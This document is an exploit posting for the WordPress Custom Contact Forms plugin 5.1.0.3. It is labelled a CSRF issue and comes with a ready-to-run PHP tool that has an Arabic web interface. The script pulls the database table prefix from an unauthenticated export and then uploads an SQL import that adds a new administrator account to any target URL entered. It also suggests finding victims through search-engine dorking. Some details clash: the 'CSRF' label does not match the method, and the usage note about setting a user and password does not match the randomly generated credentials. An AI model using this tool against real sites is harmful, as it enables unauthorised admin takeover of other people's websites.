=============================================================================================================================================
| # Title     : WordPress Custom contact forms Plugin v 5.1.0.3 CSRF Vulnerability                                                          |
| # Author    : indoushka                                                                                                                   |
| # Tested on : windows 10 Fr(Pro) / browser : Mozilla firefox 135.0.1 (64 bits)                                                            |
| # Vendor    : https://wordpress.org/                                                                                                      |
=============================================================================================================================================

POC :

[+] Dorking İn Google Or Other Search Enggine.

[+] Code Description: This code attempts to exploit a vulnerability in WordPress to add a new admin user.
   
   (linked: https://packetstorm.news/files/id/180885/ Linked CVE numbers: ),
	
[+] save code as poc.php.

[+] Line 70 set you user & pass

[+] USage : http://127.0.0.1/poc.php 

[+] PayLoad :

<?php
// واجهة لإدارة استغلال ثغرة custom-contact-forms في ووردبريس
error_reporting(0);
session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $target = $_POST['target'];
    $username = substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'), 0, 10);
    $password = substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'), 0, 20);
    
    function getTablePrefix($target) {
        $export_url = "$target/wp-admin/admin-post.php";
        
        $postdata = http_build_query([ 'ccf_export' => '1' ]);
        $opts = ['http' => ['method' => 'POST', 'content' => $postdata]];
        $context = stream_context_create($opts);
        $response = file_get_contents($export_url, false, $context);
        
        if (!$response || !preg_match('/insert into `(.+_)customcontactforms_fields`/i', $response, $matches)) {
            return null;
        }
        return $matches[1];
    }
    
    $table_prefix = getTablePrefix($target);
    if (!$table_prefix) {
        echo "<p>تعذر الحصول على بادئة الجدول!</p>";
        exit;
    }
    
    $sql = "INSERT INTO {$table_prefix}users (user_login, user_pass) VALUES ('$username', MD5('$password'));
            INSERT INTO {$table_prefix}usermeta (user_id, meta_key, meta_value) 
            VALUES ((SELECT id FROM {$table_prefix}users WHERE user_login='$username'), '{$table_prefix}capabilities', 'a:1:{s:13:\"administrator\";b:1;}');";
    
    $boundary = md5(time());
    $data = "--$boundary\r\n";
    $data .= "Content-Disposition: form-data; name=\"import_file\"; filename=\"exploit.sql\"\r\n";
    $data .= "Content-Type: text/plain\r\n\r\n";
    $data .= "$sql\r\n";
    $data .= "--$boundary\r\n";
    $data .= "Content-Disposition: form-data; name=\"ccf_merge_import\"\r\n\r\n1\r\n";
    $data .= "--$boundary--\r\n";
    
    $opts = ['http' => ['method' => 'POST', 'header' => "Content-Type: multipart/form-data; boundary=$boundary", 'content' => $data]];
    $context = stream_context_create($opts);
    $result = file_get_contents("$target/wp-admin/admin-post.php", false, $context);
    
    if ($result) {
        echo "<p>تم إنشاء مستخدم جديد بنجاح!<br>indoushka: <b>$username</b><br>packet2025strom: <b>$password</b></p>";
    } else {
        echo "<p>فشل في تنفيذ الهجوم!</p>";
    }
}
?>

<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>استغلال ثغرة ووردبريس</title>
</head>
<body>
    <h2>استغلال ثغرة ووردبريس - custom-contact-forms</h2>
    <form method="POST">
        <label>رابط الموقع المستهدف:</label>
        <input type="text" name="target" required>
        <button type="submit">تنفيذ</button>
    </form>
</body>
</html>


Greetings to :=====================================================================================
jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
===================================================================================================